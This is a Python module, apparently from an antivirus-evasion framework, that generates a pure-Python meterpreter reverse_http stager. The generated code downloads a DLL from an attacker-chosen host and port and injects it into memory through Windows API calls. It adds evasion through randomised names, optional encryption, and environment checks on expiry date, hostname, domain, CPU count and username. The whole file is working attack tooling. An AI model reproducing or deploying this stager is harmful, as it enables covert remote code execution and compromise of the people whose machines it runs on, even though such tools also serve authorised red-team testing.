"""

Custom-written pure python meterpreter/reverse_http stager,
compatible with Cobalt-Stike's Beacon

Module by @harmj0y

"""

from datetime import date
from datetime import timedelta
from Tools.Evasion.evasion_common import encryption
from Tools.Evasion.evasion_common import evasion_helpers


class PayloadModule:

    def __init__(self, cli_obj):
        # required options
        self.description = "pure windows/meterpreter/reverse_http stager, no shellcode"
        self.language = "python"
        self.extension = "py"
        self.rating = "Excellent"
        self.name = "Pure Python Reverse HTTP Stager"
        self.path = "python/meterpreter/rev_http"
        self.cli_opts = cli_obj
        self.payload_source_code = ''
        if cli_obj.ordnance_payload is not None:
            self.payload_type = cli_obj.ordnance_payload
        elif cli_obj.msfvenom is not None:
            self.payload_type = cli_obj.msfvenom
        elif not cli_obj.tool:
            self.payload_type = ''

        # options we require user interaction for- format is {OPTION : [Value, Description]]}
        self.required_options = {
            "LHOST"          : ["", "The listen target address"],
            "LPORT"          : ["4444", "The listen port"],
            "COMPILE_TO_EXE" : ["Y", "Compile to an executable"],
            "USE_PYHERION"   : ["N", "Use the pyherion encrypter"],
            "INJECT_METHOD"  : ["Virtual", "Virtual, Void, or Heap"],
            "EXPIRE_PAYLOAD" : ["X", "Optional: Payloads expire after \"Y\" days"],
            "HOSTNAME"       : ["X", "Optional: Required system hostname"],
            "DOMAIN"         : ["X", "Optional: Required internal domain"],
            "PROCESSORS"     : ["X", "Optional: Minimum number of processors"],
            "USERNAME"       : ["X", "Optional: The required user account"]
        }

    def generate(self):

        sumMethodName = evasion_helpers.randomString()
        checkinMethodName = evasion_helpers.randomString()

        randLettersName = evasion_helpers.randomString()
        randLetterSubName = evasion_helpers.randomString()
        randBaseName = evasion_helpers.randomString()

        downloadMethodName = evasion_helpers.randomString()
        hostName = evasion_helpers.randomString()
        portName = evasion_helpers.randomString()
        requestName = evasion_helpers.randomString()
        tName = evasion_helpers.randomString()

        injectMethodName = evasion_helpers.randomString()
        dataName = evasion_helpers.randomString()
        byteArrayName = evasion_helpers.randomString()
        ptrName = evasion_helpers.randomString()
        bufName = evasion_helpers.randomString()
        handleName = evasion_helpers.randomString()
        data2Name = evasion_helpers.randomString()
        proxy_var = evasion_helpers.randomString()
        opener_var = evasion_helpers.randomString()
        randctypes = evasion_helpers.randomString()

        payload_code = "import urllib.request, string, random, ctypes as " + randctypes + "\n"

        # How I'm tracking the number of nested tabs needed
        # to make the payload
        num_tabs_required = 0
        payload_code = ''

        if self.required_options["EXPIRE_PAYLOAD"][0].lower() != "x":

            RandToday = evasion_helpers.randomString()
            RandExpire = evasion_helpers.randomString()

            todaysdate = date.today()
            expiredate = str(todaysdate + timedelta(days=int(self.required_options["EXPIRE_PAYLOAD"][0])))

            # Create Payload code
            payload_code += '\t' * num_tabs_required + 'from datetime import datetime\n'
            payload_code += '\t' * num_tabs_required + 'from datetime import date\n'
            payload_code += '\t' * num_tabs_required + RandToday + ' = datetime.now()\n'
            payload_code += '\t' * num_tabs_required + RandExpire + ' = datetime.strptime(\"' + expiredate[2:] + '\",\"%y-%m-%d\") \n'
            payload_code += '\t' * num_tabs_required + 'if ' + RandToday + ' < ' + RandExpire + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["HOSTNAME"][0].lower() != "x":

            rand_hostname = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import platform\n'
            payload_code += '\t' * num_tabs_required + rand_hostname + ' = platform.node()\n'
            payload_code += '\t' * num_tabs_required + 'if ' + rand_hostname + ' in \"' + self.required_options["HOSTNAME"][0] + '\":\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["DOMAIN"][0].lower() != "x":

            rand_domain = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import socket\n'
            payload_code += '\t' * num_tabs_required + rand_domain + ' = socket.getfqdn()\n'
            payload_code += '\t' * num_tabs_required + 'if ' + rand_domain + ' in \"' + self.required_options["DOMAIN"][0] + '\":\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["PROCESSORS"][0].lower() != "x":

            rand_processor_count = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import multiprocessing\n'
            payload_code += '\t' * num_tabs_required + rand_processor_count + ' = multiprocessing.cpu_count()\n'
            payload_code += '\t' * num_tabs_required + 'if ' + rand_processor_count + ' >= ' + self.required_options["PROCESSORS"][0] + ':\n'

            # Add a tab for this check
            num_tabs_required += 1

        if self.required_options["USERNAME"][0].lower() != "x":

            rand_user_name = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + 'import getpass\n'
            payload_code += '\t' * num_tabs_required + rand_user_name + ' = getpass.getuser()\n'
            payload_code += '\t' * num_tabs_required + 'if \'' + self.required_options["USERNAME"][0] + '\'.lower() in ' + rand_user_name + '.lower():\n'

            # Add a tab for this check
            num_tabs_required += 1

        # helper method that returns the sum of all ord values in a string % 0x100
        payload_code += '\t' * num_tabs_required + "def " + sumMethodName + "(s): return sum([ord(ch) for ch in s]) %% 0x100\n"

        # method that generates a new checksum value for checkin to the meterpreter handler
        payload_code += '\t' * num_tabs_required + "def " + checkinMethodName + "():\n\tfor x in range(64):\n"
        payload_code += '\t' * num_tabs_required + "\t\t" + randBaseName + " = ''.join(random.sample(string.ascii_letters + string.digits,3))\n"
        payload_code += '\t' * num_tabs_required + "\t\t" + randLettersName + " = ''.join(sorted(list(string.ascii_letters+string.digits), key=lambda *args: random.random()))\n"
        payload_code += '\t' * num_tabs_required + "\t\tfor " + randLetterSubName + " in " + randLettersName + ":\n"
        payload_code += '\t' * num_tabs_required + "\t\t\tif " + sumMethodName + "(" + randBaseName + " + " + randLetterSubName + ") == 92: return " + randBaseName + " + " + randLetterSubName + "\n"

        # method that connects to a host/port over http and downloads the hosted data
        payload_code += '\t' * num_tabs_required + "def " + downloadMethodName + "(" + hostName + ", " + portName + "):\n"
        payload_code += '\t' * num_tabs_required + "\t" + proxy_var + " = urllib.request.ProxyHandler({})\n"
        payload_code += '\t' * num_tabs_required + "\t" + opener_var + " = urllib.request.build_opener(" + proxy_var + ")\n"
        payload_code += '\t' * num_tabs_required + "\turllib.request.install_opener(" + opener_var + ")\n"
        payload_code += '\t' * num_tabs_required + "\t" + requestName + " = urllib.request.Request(\"http://%%s:%%s/%%s\" %%(" + hostName + ", " + portName + ", " + checkinMethodName + "()), None, {'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)'})\n"
        payload_code += '\t' * num_tabs_required + "\ttry:\n"
        payload_code += '\t' * num_tabs_required + "\t\t" + tName + " = urllib.request.urlopen(" + requestName + ")\n"
        payload_code += '\t' * num_tabs_required + "\t\ttry:\n"
        payload_code += '\t' * num_tabs_required + "\t\t\tif int(" + tName + ".info()[\"Content-Length\"]) > 100000: return " + tName + ".read()\n"
        payload_code += '\t' * num_tabs_required + "\t\t\telse: return ''\n"
        payload_code += '\t' * num_tabs_required + "\t\texcept: return " + tName + ".read()\n"
        payload_code += '\t' * num_tabs_required + "\texcept urllib.request.URLError:\n"
        payload_code += '\t' * num_tabs_required + "\t\treturn ''\n"

        # method to inject a reflective .dll into memory
        payload_code += '\t' * num_tabs_required + "def " + injectMethodName + "(" + dataName + "):\n"
        payload_code += '\t' * num_tabs_required + "\tif " + dataName + " != \"\":\n"
        payload_code += '\t' * num_tabs_required + "\t\t" + byteArrayName + " = bytearray(" + dataName + ")\n"

        if self.required_options["INJECT_METHOD"][0].lower() == "virtual":
            payload_code += '\t' * num_tabs_required + "\t\t" + ptrName + " = " + randctypes + ".windll.kernel32.VirtualAlloc(" + randctypes + ".c_int(0)," + randctypes + ".c_int(len(" + byteArrayName + ")), " + randctypes + ".c_int(0x3000)," + randctypes + ".c_int(0x40))\n"
            payload_code += '\t' * num_tabs_required + "\t\t" + bufName + " = (" + randctypes + ".c_char * len(" + byteArrayName + ")).from_buffer(" + byteArrayName + ")\n"
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + ".windll.kernel32.RtlMoveMemory(" + randctypes + ".c_int(" + ptrName + ")," + bufName + ", " + randctypes + ".c_int(len(" + byteArrayName + ")))\n"
            payload_code += '\t' * num_tabs_required + "\t\t" + handleName + " = " + randctypes + ".windll.kernel32.CreateThread(" + randctypes + ".c_int(0)," + randctypes + ".c_int(0)," + randctypes + ".c_int(" + ptrName + ")," + randctypes + ".c_int(0)," + randctypes + ".c_int(0)," + randctypes + ".pointer(" + randctypes + ".c_int(0)))\n"
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + ".windll.kernel32.WaitForSingleObject(" + randctypes + ".c_int(" + handleName + ")," + randctypes + ".c_int(-1))\n"

        # Assuming heap injection
        else:
            HeapVar = evasion_helpers.randomString()

            payload_code += '\t' * num_tabs_required + "\t\t" + HeapVar + ' = ' + randctypes + '.windll.kernel32.HeapCreate(' + randctypes + '.c_int(0x00040000),' + randctypes + '.c_int(len(' + byteArrayName + ') * 2),' + randctypes + '.c_int(0))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + ptrName + ' = ' + randctypes + '.windll.kernel32.HeapAlloc(' + randctypes + '.c_int(' + HeapVar + '),' + randctypes + '.c_int(0x00000008),' + randctypes + '.c_int(len( ' + byteArrayName + ')))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + bufName + ' = (' + randctypes + '.c_char * len(' + byteArrayName + ')).from_buffer(' + byteArrayName + ')\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.RtlMoveMemory(' + randctypes + '.c_int(' + ptrName + '),' + bufName + ',' + randctypes + '.c_int(len(' + byteArrayName + ')))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + handleName + ' = ' + randctypes + '.windll.kernel32.CreateThread(' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.c_int(' + ptrName + '),' + randctypes + '.c_int(0),' + randctypes + '.c_int(0),' + randctypes + '.pointer(' + randctypes + '.c_int(0)))\n'
            payload_code += '\t' * num_tabs_required + "\t\t" + randctypes + '.windll.kernel32.WaitForSingleObject(' + randctypes + '.c_int(' + handleName + '),' + randctypes + '.c_int(-1))\n'

        # download the metpreter .dll and inject it
        payload_code += '\t' * num_tabs_required + data2Name + " = ''\n"
        payload_code += '\t' * num_tabs_required + data2Name + " = " + downloadMethodName + "(\"" + self.required_options["LHOST"][0] + "\", " + self.required_options["LPORT"][0] + ")\n"
        payload_code += '\t' * num_tabs_required + injectMethodName + "(" + data2Name + ")\n"

        if self.required_options["USE_PYHERION"][0].lower() == "y":
            payload_code = encryption.pyherion(payload_code)

        self.payload_source_code = payload_code
        return
